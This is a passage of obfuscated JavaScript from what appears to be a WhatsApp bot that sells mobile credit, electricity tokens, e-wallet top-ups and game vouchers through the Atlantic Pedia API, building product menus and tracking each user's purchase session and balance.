_0x59e157[_0x311568(0xe0)][_0x311568(0xe0)]){_0x13848d[_0x311568(0xe5)][_0x311568(0x152)](_0x311568(0x144))&&_0xcbe4a1['push'](_0x13848d);}_0xcbe4a1[_0x311568(0x11b)](_0x2917ac);for(let _0xb8638 of _0xcbe4a1){_0x360abd[_0x311568(0x14c)]({'title':_0xb8638[_0x311568(0x102)]+('\x20'+(_0xb8638['status']=='empty'?_0x311568(0x16f):'')),'rowId':_0x311568(0x11f)+_0xb8638['code']+_0x311568(0x141)+_0xb8638[_0x311568(0x11d)],'description':_0x311568(0x14b)+toRupiah(Number(_0xb8638[_0x311568(0x11d)]))});}var _0x16ecfa={'text':_0x311568(0x106),'buttonText':_0x311568(0x117),'sections':[{'title':_0x311568(0xed),'rows':_0x360abd}]};data_topup[_0x311568(0xf2)]=_0x311568(0x115),fs['writeFileSync'](topupPath+sender[_0x311568(0x15a)]('@')[0x0]+'.json',JSON[_0x311568(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,_0x16ecfa);});else{if(isListMessage===_0x1ef6e3(0xda))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting['apikey_antlatic'],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x58354c=>{const _0x28beb7=_0x1ef6e3,_0x2be0d2=(_0x1666aa,_0xafb9d3)=>{const _0x5f059c=_0x1578,_0x19c431=Number(_0x1666aa['price'][_0x5f059c(0x16d)](/[^0-9.-]+/g,'')),_0x509baa=Number(_0xafb9d3[_0x5f059c(0x11d)][_0x5f059c(0x16d)](/[^0-9.-]+/g,''));return _0x19c431-_0x509baa;};if(_0x58354c['data'][_0x28beb7(0x12b)]==![])return reply(_0x28beb7(0xfa));let _0x3bf8a2=[],_0x3ff082=[];for(let _0x5e6f13 of _0x58354c[_0x28beb7(0xe0)][_0x28beb7(0xe0)]){_0x5e6f13[_0x28beb7(0xe5)][_0x28beb7(0x152)](_0x28beb7(0x10d))&&_0x3bf8a2['push'](_0x5e6f13);}_0x3bf8a2[_0x28beb7(0x11b)](_0x2be0d2);for(let _0xbe7ec2 of _0x3bf8a2){_0x3ff082[_0x28beb7(0x14c)]({'title':_0xbe7ec2['name']+('\x20'+(_0xbe7ec2[_0x28beb7(0xdc)]==_0x28beb7(0x16a)?_0x28beb7(0x16f):'')),'rowId':_0x28beb7(0x11f)+_0xbe7ec2[_0x28beb7(0xe5)]+_0x28beb7(0x141)+_0xbe7ec2[_0x28beb7(0x11d)],'description':_0x28beb7(0x14b)+toRupiah(Number(_0xbe7ec2[_0x28beb7(0x11d)]))});}var _0x1d5cef={'text':'Silahkan\x20pilih\x20nominal\x20pulsanya','buttonText':'Touch\x20me\x20senpai','sections':[{'title':'Nominal\x20Pulsa\x20Indosat','rows':_0x3ff082}]};data_topup[_0x28beb7(0xf2)]=_0x28beb7(0x115),fs[_0x28beb7(0x111)](topupPath+sender[_0x28beb7(0x15a)]('@')[0x0]+_0x28beb7(0xfb),JSON['stringify'](data_topup,null,0x3)),conn[_0x28beb7(0x160)](from,_0x1d5cef);});else{if(isListMessage===_0x1ef6e3(0x12e))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x499cde=>{const _0x24d320=_0x1ef6e3,_0x39be64=(_0x4cdea5,_0x27d15b)=>{const _0x1227c6=_0x1578,_0x238fae=Number(_0x4cdea5[_0x1227c6(0x11d)][_0x1227c6(0x16d)](/[^0-9.-]+/g,'')),_0x28e815=Number(_0x27d15b[_0x1227c6(0x11d)][_0x1227c6(0x16d)](/[^0-9.-]+/g,''));return _0x238fae-_0x28e815;};if(_0x499cde[_0x24d320(0xe0)]['result']==![])return reply(_0x24d320(0xfa));let _0x515bdb=[],_0x3a1873=[];for(let _0x42ebd2 of _0x499cde['data'][_0x24d320(0xe0)]){_0x42ebd2['code']['includes'](_0x24d320(0x114))&&_0x515bdb[_0x24d320(0x14c)](_0x42ebd2);}_0x515bdb[_0x24d320(0x11b)](_0x39be64);for(let _0x91b94c of _0x515bdb){_0x3a1873[_0x24d320(0x14c)]({'title':_0x91b94c[_0x24d320(0x102)]+('\x20'+(_0x91b94c[_0x24d320(0xdc)]==_0x24d320(0x16a)?_0x24d320(0x16f):'')),'rowId':'id='+_0x91b94c['code']+_0x24d320(0x141)+_0x91b94c[_0x24d320(0x11d)],'description':'Harga:\x20Rp\x20'+toRupiah(Number(_0x91b94c['price']))});}var _0x344e6b={'text':_0x24d320(0x106),'buttonText':_0x24d320(0x117),'sections':[{'title':_0x24d320(0x121),'rows':_0x3a1873}]};data_topup[_0x24d320(0xf2)]=_0x24d320(0x115),fs[_0x24d320(0x111)](topupPath+sender['split']('@')[0x0]+_0x24d320(0xfb),JSON[_0x24d320(0xec)](data_topup,null,0x3)),conn[_0x24d320(0x160)](from,_0x344e6b);});else{if(isListMessage==='pulsa_axis')axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})['then'](_0x2d8245=>{const _0x193b20=_0x1ef6e3,_0x20bd56=(_0x138696,_0x13f1b4)=>{const _0x3f3c8f=_0x1578,_0x238752=Number(_0x138696[_0x3f3c8f(0x11d)][_0x3f3c8f(0x16d)](/[^0-9.-]+/g,'')),_0x2f1755=Number(_0x13f1b4[_0x3f3c8f(0x11d)][_0x3f3c8f(0x16d)](/[^0-9.-]+/g,''));return _0x238752-_0x2f1755;};if(_0x2d8245['data'][_0x193b20(0x12b)]==![])return reply('Server\x20maintenance.');let _0x57705f=[],_0x5cf15a=[];for(let _0x3b2ecd of _0x2d8245[_0x193b20(0xe0)][_0x193b20(0xe0)]){_0x3b2ecd[_0x193b20(0xe5)][_0x193b20(0x152)](_0x193b20(0xf0))&&_0x57705f['push'](_0x3b2ecd);}_0x57705f['sort'](_0x20bd56);for(let _0x424e8a of _0x57705f){_0x5cf15a['push']({'title':_0x424e8a[_0x193b20(0x102)]+('\x20'+(_0x424e8a['status']==_0x193b20(0x16a)?'(Kosong)':'')),'rowId':_0x193b20(0x11f)+_0x424e8a[_0x193b20(0xe5)]+_0x193b20(0x141)+_0x424e8a[_0x193b20(0x11d)],'description':_0x193b20(0x14b)+toRupiah(Number(_0x424e8a['price']))});}var _0x2559e7={'text':_0x193b20(0x106),'buttonText':_0x193b20(0x117),'sections':[{'title':_0x193b20(0x169),'rows':_0x5cf15a}]};data_topup[_0x193b20(0xf2)]='PILIH-LIST-GAME',fs[_0x193b20(0x111)](topupPath+sender['split']('@')[0x0]+_0x193b20(0xfb),JSON[_0x193b20(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,_0x2559e7);});else{if(isListMessage==='topup_pln')axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})['then'](_0x1c75f9=>{const _0x156f01=_0x1ef6e3,_0x5bdad8=(_0x2d2b1a,_0x47ebbb)=>{const _0x1a5fea=_0x1578,_0x553b57=Number(_0x2d2b1a[_0x1a5fea(0x11d)][_0x1a5fea(0x16d)](/[^0-9.-]+/g,'')),_0x5b443c=Number(_0x47ebbb['price'][_0x1a5fea(0x16d)](/[^0-9.-]+/g,''));return _0x553b57-_0x5b443c;};if(_0x1c75f9[_0x156f01(0xe0)][_0x156f01(0x12b)]==![])return reply(_0x156f01(0xfa));let _0xdf25ec=[],_0x421551=[];for(let _0x1fdc1c of _0x1c75f9[_0x156f01(0xe0)][_0x156f01(0xe0)]){_0x1fdc1c[_0x156f01(0xe5)][_0x156f01(0x152)](_0x156f01(0x16b))&&_0xdf25ec[_0x156f01(0x14c)](_0x1fdc1c);}_0xdf25ec[_0x156f01(0x11b)](_0x5bdad8);for(let _0x40bca8 of _0xdf25ec){_0x421551['push']({'title':_0x40bca8[_0x156f01(0x102)]+('\x20'+(_0x40bca8[_0x156f01(0xdc)]==_0x156f01(0x16a)?'(Kosong)':'')),'rowId':_0x156f01(0x11f)+_0x40bca8[_0x156f01(0xe5)]+'&harga='+_0x40bca8['price'],'description':_0x156f01(0x14b)+toRupiah(Number(_0x40bca8[_0x156f01(0x11d)]))});}var _0x5e9f35={'text':_0x156f01(0x125),'buttonText':'Touch\x20me\x20senpai','sections':[{'title':_0x156f01(0xf8),'rows':_0x421551}]};data_topup['session']=_0x156f01(0x115),fs[_0x156f01(0x111)](topupPath+sender[_0x156f01(0x15a)]('@')[0x0]+_0x156f01(0xfb),JSON[_0x156f01(0xec)](data_topup,null,0x3)),conn[_0x156f01(0x160)](from,_0x5e9f35);});else{if(isListMessage===_0x1ef6e3(0x112))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x3ab71a=>{const _0x4eb87e=_0x1ef6e3,_0x45bc73=(_0x5d7f1e,_0x2ce40f)=>{const _0x1a1601=_0x1578,_0x3c6d72=Number(_0x5d7f1e[_0x1a1601(0x11d)][_0x1a1601(0x16d)](/[^0-9.-]+/g,'')),_0x5b0847=Number(_0x2ce40f[_0x1a1601(0x11d)]['replace'](/[^0-9.-]+/g,''));return _0x3c6d72-_0x5b0847;};if(_0x3ab71a[_0x4eb87e(0xe0)][_0x4eb87e(0x12b)]==![])return reply('Server\x20maintenance.');let _0x10fbac=[],_0x2cf984=[];for(let _0x4bd08a of _0x3ab71a[_0x4eb87e(0xe0)][_0x4eb87e(0xe0)]){_0x4bd08a[_0x4eb87e(0xe5)][_0x4eb87e(0x152)](_0x4eb87e(0x10e))&&_0x10fbac['push'](_0x4bd08a);}_0x10fbac[_0x4eb87e(0x11b)](_0x45bc73);for(let _0x897f9a of _0x10fbac){_0x2cf984[_0x4eb87e(0x14c)]({'title':_0x897f9a['name']+('\x20'+(_0x897f9a['status']==_0x4eb87e(0x16a)?_0x4eb87e(0x16f):'')),'rowId':_0x4eb87e(0x11f)+_0x897f9a[_0x4eb87e(0xe5)]+_0x4eb87e(0x141)+_0x897f9a[_0x4eb87e(0x11d)],'description':_0x4eb87e(0x14b)+toRupiah(Number(_0x897f9a[_0x4eb87e(0x11d)]))});}var _0x1bbf15={'text':_0x4eb87e(0x118),'buttonText':'Touch\x20me\x20senpai','sections':[{'title':'Topup\x20Saldo\x20Ovo','rows':_0x2cf984}]};data_topup[_0x4eb87e(0xf2)]=_0x4eb87e(0x115),fs['writeFileSync'](topupPath+sender[_0x4eb87e(0x15a)]('@')[0x0]+_0x4eb87e(0xfb),JSON[_0x4eb87e(0xec)](data_topup,null,0x3)),conn[_0x4eb87e(0x160)](from,_0x1bbf15);});else{if(isListMessage===_0x1ef6e3(0x136))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x93ebf=>{const _0x57f7ba=_0x1ef6e3,_0x3ecd4b=(_0x1c7c1a,_0x31ca06)=>{const _0x57b8e9=_0x1578,_0x2125d0=Number(_0x1c7c1a['price']['replace'](/[^0-9.-]+/g,'')),_0x5bd05b=Number(_0x31ca06[_0x57b8e9(0x11d)][_0x57b8e9(0x16d)](/[^0-9.-]+/g,''));return _0x2125d0-_0x5bd05b;};if(_0x93ebf['data']['result']==![])return reply(_0x57f7ba(0xfa));let _0x3cb2cc=[],_0x4f76b1=[];for(let _0x39421d of _0x93ebf['data'][_0x57f7ba(0xe0)]){_0x39421d[_0x57f7ba(0xe5)][_0x57f7ba(0x152)](_0x57f7ba(0x139))&&_0x3cb2cc[_0x57f7ba(0x14c)](_0x39421d);}_0x3cb2cc['sort'](_0x3ecd4b);for(let _0x57b443 of _0x3cb2cc){_0x4f76b1[_0x57f7ba(0x14c)]({'title':_0x57b443['name']+('\x20'+(_0x57b443[_0x57f7ba(0xdc)]==_0x57f7ba(0x16a)?'(Kosong)':'')),'rowId':_0x57f7ba(0x11f)+_0x57b443[_0x57f7ba(0xe5)]+'&harga='+_0x57b443['price'],'description':_0x57f7ba(0x14b)+toRupiah(Number(_0x57b443[_0x57f7ba(0x11d)]))});}var _0x38da3d={'text':'Silahkan\x20pilih\x20nominal\x20saldo','buttonText':_0x57f7ba(0x117),'sections':[{'title':_0x57f7ba(0x157),'rows':_0x4f76b1}]};data_topup[_0x57f7ba(0xf2)]=_0x57f7ba(0x115),fs[_0x57f7ba(0x111)](topupPath+sender[_0x57f7ba(0x15a)]('@')[0x0]+'.json',JSON['stringify'](data_topup,null,0x3)),conn[_0x57f7ba(0x160)](from,_0x38da3d);});else{if(isListMessage===_0x1ef6e3(0xee))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})['then'](_0x16f6c8=>{const _0x517e0e=_0x1ef6e3,_0x4ba8a4=(_0x21aa40,_0x24ea42)=>{const _0x364505=_0x1578,_0x217d40=Number(_0x21aa40[_0x364505(0x11d)][_0x364505(0x16d)](/[^0-9.-]+/g,'')),_0x4caee4=Number(_0x24ea42[_0x364505(0x11d)][_0x364505(0x16d)](/[^0-9.-]+/g,''));return _0x217d40-_0x4caee4;};if(_0x16f6c8[_0x517e0e(0xe0)]['result']==![])return reply(_0x517e0e(0xfa));let _0x4b130c=[],_0x3088f1=[];for(let _0x37b37b of _0x16f6c8[_0x517e0e(0xe0)][_0x517e0e(0xe0)]){_0x37b37b[_0x517e0e(0xe5)]['includes'](_0x517e0e(0xfd))&&_0x4b130c[_0x517e0e(0x14c)](_0x37b37b);}_0x4b130c[_0x517e0e(0x11b)](_0x4ba8a4);for(let _0xb316f8 of _0x4b130c){_0x3088f1[_0x517e0e(0x14c)]({'title':_0xb316f8[_0x517e0e(0x102)]+('\x20'+(_0xb316f8['status']==_0x517e0e(0x16a)?'(Kosong)':'')),'rowId':'id='+_0xb316f8['code']+_0x517e0e(0x141)+_0xb316f8[_0x517e0e(0x11d)],'description':'Harga:\x20Rp\x20'+toRupiah(Number(_0xb316f8[_0x517e0e(0x11d)]))});}var _0x12443d={'text':_0x517e0e(0x118),'buttonText':_0x517e0e(0x117),'sections':[{'title':'Topup\x20Saldo\x20ShoopeePay','rows':_0x3088f1}]};data_topup['session']=_0x517e0e(0x115),fs[_0x517e0e(0x111)](topupPath+sender[_0x517e0e(0x15a)]('@')[0x0]+'.json',JSON[_0x517e0e(0xec)](data_topup,null,0x3)),conn[_0x517e0e(0x160)](from,_0x12443d);});else{if(isListMessage===_0x1ef6e3(0x13e))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})['then'](_0x3e8e6d=>{const _0x3840a6=_0x1ef6e3,_0x4938c9=(_0x11cc75,_0x4a2810)=>{const _0x6f06e0=_0x1578,_0x22a9dd=Number(_0x11cc75['price'][_0x6f06e0(0x16d)](/[^0-9.-]+/g,'')),_0x3c036b=Number(_0x4a2810[_0x6f06e0(0x11d)][_0x6f06e0(0x16d)](/[^0-9.-]+/g,''));return _0x22a9dd-_0x3c036b;};if(_0x3e8e6d[_0x3840a6(0xe0)][_0x3840a6(0x12b)]==![])return reply(_0x3840a6(0xfa));let _0x37b8dc=[],_0x4a710b=[];for(let _0x39b2a3 of _0x3e8e6d['data']['data']){_0x39b2a3['code'][_0x3840a6(0x152)](_0x3840a6(0x151))&&_0x37b8dc[_0x3840a6(0x14c)](_0x39b2a3);}_0x37b8dc['sort'](_0x4938c9);for(let _0x55c5c7 of _0x37b8dc){_0x4a710b[_0x3840a6(0x14c)]({'title':_0x55c5c7[_0x3840a6(0x102)]+('\x20'+(_0x55c5c7[_0x3840a6(0xdc)]==_0x3840a6(0x16a)?_0x3840a6(0x16f):'')),'rowId':_0x3840a6(0x11f)+_0x55c5c7[_0x3840a6(0xe5)]+_0x3840a6(0x141)+_0x55c5c7['price'],'description':_0x3840a6(0x14b)+toRupiah(Number(_0x55c5c7[_0x3840a6(0x11d)]))});}var _0x327f58={'text':_0x3840a6(0x118),'buttonText':_0x3840a6(0x117),'sections':[{'title':'Topup\x20Saldo\x20Gopay','rows':_0x4a710b}]};data_topup[_0x3840a6(0xf2)]=_0x3840a6(0x115),fs[_0x3840a6(0x111)](topupPath+sender[_0x3840a6(0x15a)]('@')[0x0]+_0x3840a6(0xfb),JSON[_0x3840a6(0xec)](data_topup,null,0x3)),conn[_0x3840a6(0x160)](from,_0x327f58);});else{if(isListMessage===_0x1ef6e3(0x162))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x4f397a=>{const _0x1c34fd=_0x1ef6e3,_0x39c2a9=(_0x4c8a2f,_0x56f95c)=>{const _0x2510f3=_0x1578,_0x51c709=Number(_0x4c8a2f[_0x2510f3(0x11d)]['replace'](/[^0-9.-]+/g,'')),_0x4ee7db=Number(_0x56f95c['price'][_0x2510f3(0x16d)](/[^0-9.-]+/g,''));return _0x51c709-_0x4ee7db;};if(_0x4f397a[_0x1c34fd(0xe0)]['result']==![])return reply(_0x1c34fd(0xfa));let _0x57b33e=[],_0x394056=[];for(let _0x55e819 of _0x4f397a['data'][_0x1c34fd(0xe0)]){_0x55e819[_0x1c34fd(0xe5)][_0x1c34fd(0x152)]('DANA')&&_0x57b33e[_0x1c34fd(0x14c)](_0x55e819);}_0x57b33e[_0x1c34fd(0x11b)](_0x39c2a9);for(let _0x2d334a of _0x57b33e){_0x394056['push']({'title':_0x2d334a[_0x1c34fd(0x102)]+('\x20'+(_0x2d334a[_0x1c34fd(0xdc)]=='empty'?_0x1c34fd(0x16f):'')),'rowId':'id='+_0x2d334a[_0x1c34fd(0xe5)]+'&harga='+_0x2d334a[_0x1c34fd(0x11d)],'description':_0x1c34fd(0x14b)+toRupiah(Number(_0x2d334a[_0x1c34fd(0x11d)]))});}var _0x6a336e={'text':_0x1c34fd(0x118),'buttonText':_0x1c34fd(0x117),'sections':[{'title':_0x1c34fd(0x14d),'rows':_0x394056}]};data_topup['session']=_0x1c34fd(0x115),fs['writeFileSync'](topupPath+sender['split']('@')[0x0]+_0x1c34fd(0xfb),JSON['stringify'](data_topup,null,0x3)),conn[_0x1c34fd(0x160)](from,_0x6a336e);});else{if(isListMessage===_0x1ef6e3(0x101))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})['then'](_0x2706d9=>{const _0x1efba6=_0x1ef6e3,_0x4918bd=(_0xad863e,_0x479066)=>{const _0x5d5269=_0x1578,_0x1405c9=Number(_0xad863e[_0x5d5269(0x11d)][_0x5d5269(0x16d)](/[^0-9.-]+/g,'')),_0x34b17c=Number(_0x479066[_0x5d5269(0x11d)][_0x5d5269(0x16d)](/[^0-9.-]+/g,''));return _0x1405c9-_0x34b17c;};if(_0x2706d9[_0x1efba6(0xe0)][_0x1efba6(0x12b)]==![])return reply(_0x1efba6(0xfa));let _0x54ff18=[],_0x3094a8=[];for(let _0x1c609a of _0x2706d9['data']['data']){_0x1c609a[_0x1efba6(0xe5)][_0x1efba6(0x152)]('VGR')&&_0x54ff18[_0x1efba6(0x14c)](_0x1c609a);}_0x54ff18[_0x1efba6(0x11b)](_0x4918bd);for(let _0x13a202 of _0x54ff18){_0x3094a8[_0x1efba6(0x14c)]({'title':_0x13a202[_0x1efba6(0x102)]+('\x20'+(_0x13a202[_0x1efba6(0xdc)]=='empty'?_0x1efba6(0x16f):'')),'rowId':'id='+_0x13a202[_0x1efba6(0xe5)]+_0x1efba6(0x141)+_0x13a202['price'],'description':_0x1efba6(0x14b)+toRupiah(Number(_0x13a202[_0x1efba6(0x11d)]))});}var _0x4aebbb={'text':_0x1efba6(0xff),'buttonText':_0x1efba6(0x117),'sections':[{'title':_0x1efba6(0xe1),'rows':_0x3094a8}]};data_topup[_0x1efba6(0xf2)]='PILIH-LIST-GAME',fs[_0x1efba6(0x111)](topupPath+sender[_0x1efba6(0x15a)]('@')[0x0]+_0x1efba6(0xfb),JSON[_0x1efba6(0xec)](data_topup,null,0x3)),conn[_0x1efba6(0x160)](from,_0x4aebbb);});else{if(isListMessage===_0x1ef6e3(0x163))axios({'method':_0x1ef6e3(0x124),'url':'https://www.atlantic-pedia.co.id/api/pulsa','data':qs[_0x1ef6e3(0xec)]({'key':setting['apikey_antlatic'],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x432d81=>{const _0x18ce5c=_0x1ef6e3,_0x16850c=(_0x2cd672,_0x7517a)=>{const _0x530af9=_0x1578,_0x14391d=Number(_0x2cd672[_0x530af9(0x11d)]['replace'](/[^0-9.-]+/g,'')),_0x21ac4c=Number(_0x7517a[_0x530af9(0x11d)][_0x530af9(0x16d)](/[^0-9.-]+/g,''));return _0x14391d-_0x21ac4c;};if(_0x432d81[_0x18ce5c(0xe0)][_0x18ce5c(0x12b)]==![])return reply(_0x18ce5c(0xfa));let _0x2e3ca0=[],_0x4d207a=[];for(let _0x5a9182 of _0x432d81[_0x18ce5c(0xe0)]['data']){_0x5a9182[_0x18ce5c(0xe5)][_0x18ce5c(0x152)]('FF')&&_0x2e3ca0['push'](_0x5a9182);}_0x2e3ca0[_0x18ce5c(0x11b)](_0x16850c);for(let _0xeff4e8 of _0x2e3ca0){_0x4d207a[_0x18ce5c(0x14c)]({'title':_0xeff4e8[_0x18ce5c(0x102)]+('\x20'+(_0xeff4e8[_0x18ce5c(0xdc)]==_0x18ce5c(0x16a)?_0x18ce5c(0x16f):'')),'rowId':_0x18ce5c(0x11f)+_0xeff4e8['code']+_0x18ce5c(0x141)+_0xeff4e8[_0x18ce5c(0x11d)],'description':_0x18ce5c(0x14b)+toRupiah(Number(_0xeff4e8[_0x18ce5c(0x11d)]))});}var _0x2e0810={'text':_0x18ce5c(0x15e),'buttonText':_0x18ce5c(0x117),'sections':[{'title':_0x18ce5c(0x105),'rows':_0x4d207a}]};data_topup['session']='PILIH-LIST-GAME',fs[_0x18ce5c(0x111)](topupPath+sender[_0x18ce5c(0x15a)]('@')[0x0]+'.json',JSON[_0x18ce5c(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,_0x2e0810);});else isListMessage===_0x1ef6e3(0x10b)&&axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x1222ec=>{const _0x22e935=_0x1ef6e3,_0xaa1c58=(_0x3a3e96,_0x528a89)=>{const _0x4c3bf5=_0x1578,_0x588775=Number(_0x3a3e96[_0x4c3bf5(0x11d)]['replace'](/[^0-9.-]+/g,'')),_0xc47b27=Number(_0x528a89[_0x4c3bf5(0x11d)][_0x4c3bf5(0x16d)](/[^0-9.-]+/g,''));return _0x588775-_0xc47b27;};if(_0x1222ec['data'][_0x22e935(0x12b)]==![])return reply(_0x22e935(0xfa));let _0x52d74d=[],_0x23a762=[];for(let _0x56c6f9 of _0x1222ec['data'][_0x22e935(0xe0)]){_0x56c6f9[_0x22e935(0xe5)]['startsWith'](_0x22e935(0x109))&&_0x52d74d[_0x22e935(0x14c)](_0x56c6f9);}_0x52d74d[_0x22e935(0x11b)](_0xaa1c58);for(let _0x40210b of _0x52d74d){_0x23a762[_0x22e935(0x14c)]({'title':_0x40210b['name']+('\x20'+(_0x40210b[_0x22e935(0xdc)]==_0x22e935(0x16a)?_0x22e935(0x16f):'')),'rowId':_0x22e935(0x11f)+_0x40210b[_0x22e935(0xe5)]+_0x22e935(0x141)+_0x40210b[_0x22e935(0x11d)],'description':_0x22e935(0x14b)+toRupiah(Number(_0x40210b['price']))});}var _0x4f1cd5={'text':_0x22e935(0x15e),'buttonText':'Touch\x20me\x20senpai','sections':[{'title':_0x22e935(0x129),'rows':_0x23a762}]};data_topup[_0x22e935(0xf2)]=_0x22e935(0x115),fs[_0x22e935(0x111)](topupPath+sender[_0x22e935(0x15a)]('@')[0x0]+_0x22e935(0xfb),JSON[_0x22e935(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,_0x4f1cd5);});}}}}}}}}}}}}}else{if(data_topup[_0x1ef6e3(0xf2)]===_0x1ef6e3(0x115)){if(isListMessage[_0x1ef6e3(0x152)](_0x1ef6e3(0x140))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)]['split'](_0x1ef6e3(0x141))[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)]['id_topup']=msg['message'][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)]('&harga=')[0x0],data_topup[_0x1ef6e3(0xe0)]['harga_topup']=Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)]['singleSelectReply'][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)]['produk_topup']=msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]='INPUT-GAME-ID',fs[_0x1ef6e3(0x111)](topupPath+sender['split']('@')[0x0]+'.json',JSON['stringify'](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':_0x1ef6e3(0x123)});}else{if(isListMessage[_0x1ef6e3(0x152)](_0x1ef6e3(0x144))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)]['split'](_0x1ef6e3(0x141))[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)]['id_topup']=msg['message']['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1]['split'](_0x1ef6e3(0x141))[0x0],data_topup['data'][_0x1ef6e3(0x100)]=Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)]('&harga=')[0x1]),data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)]['title'],data_topup[_0x1ef6e3(0xf2)]='INPUT-GAME-ID',fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+'.json',JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,{'text':_0x1ef6e3(0x123)});}else{if(isListMessage['includes'](_0x1ef6e3(0x10d))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)]['id_topup']=msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)]['selectedRowId'][_0x1ef6e3(0x15a)]('id=')[0x1]['split'](_0x1ef6e3(0x141))[0x0],data_topup[_0x1ef6e3(0xe0)]['harga_topup']=Number(msg['message'][_0x1ef6e3(0xf4)]['singleSelectReply']['selectedRowId'][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]=msg['message'][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup['session']=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+'.json',JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':'*Silahkan\x20kirim\x20nomor\x20hp*\x0a*wajib\x20berawal\x20dari\x20628xx\x20tanpa\x20spasi*'});}else{if(isListMessage['includes']('STF')){if(cekSaldo(sender,db_saldo)<Number(msg['message'][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]))return 